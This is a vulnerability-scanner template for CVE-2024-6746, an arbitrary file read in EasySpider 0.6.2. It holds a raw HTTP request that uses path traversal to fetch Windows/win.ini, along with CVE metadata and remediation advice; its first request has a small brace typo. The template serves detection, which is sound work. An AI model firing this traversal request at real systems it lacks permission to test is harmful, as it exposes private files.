flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - "contains_all(body,\"Task List\",\"Task ID\",\"Task Name\",\"URL\",\"<title>\u4EFB\
      \u52A1\u5217\u8868 | Task List</title>\")"
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /taskGrid/tasklist.html HTTP/1.1

    Host: {{Hostname}

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body,"bit app support","fonts","extensions")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /../../../../../../../../../Windows/win.ini HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-6746
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-6746
    cvss-metrics: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cwe-id: CWE-24
    epss-percentile: 0.99176
    epss-score: 0.82258
  description: 'A vulnerability classified as problematic was found in NaiboWang EasySpider
    0.6.2 on Windows. Affected by this vulnerability is an unknown functionality of
    the file \EasySpider\resources\app\server.js of the component HTTP GET Request
    Handler. The manipulation with the input /../../../../../../../../../Windows/win.ini
    leads to path traversal: ''../filedir''. The attack needs to be done within the
    local network.

    '
  impact: 'Attackers on the local network can exploit path traversal to read arbitrary
    files from the Windows filesystem.

    '
  metadata:
    product: easyspider
    vendor: naibowang
  name: EasySpider 0.6.2 - Arbitrary File Read
  reference:
  - https://github.com/NaiboWang/EasySpider/issues/466
  - https://cvefeed.io/vuln/detail/CVE-2024-6746
  - https://vuldb.com/?id.271477
  - https://vuldb.com/?submit.371998
  - https://vuldb.com/?ctiid.271477
  - https://github.com/NaiboWang/EasySpider
  remediation: 'Update EasySpider to version 0.6.3 or later to address the path traversal
    vulnerability.

    '
  severity: medium
  tags: cve,cve2024,lfi,network,vuln
